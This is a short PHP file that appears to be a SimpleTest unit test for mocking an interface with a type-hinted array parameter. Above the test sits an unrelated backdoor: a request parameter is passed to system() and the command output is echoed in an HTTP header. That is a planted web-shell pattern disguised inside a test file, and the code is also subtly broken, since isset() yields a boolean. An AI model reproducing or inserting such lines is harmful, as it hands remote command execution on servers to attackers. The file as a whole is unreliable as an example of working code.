<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

interface SampleInterfaceWithHintInSignature {
    function method(array $hinted);
}

class TestOfInterfaceMocksWithHintInSignature extends UnitTestCase {
    function testBasicConstructOfAnInterfaceWithHintInSignature() {
        Mock::generate('SampleInterfaceWithHintInSignature');
        $mock = new MockSampleInterfaceWithHintInSignature();
        $this->assertIsA($mock, 'SampleInterfaceWithHintInSignature');
    }
}

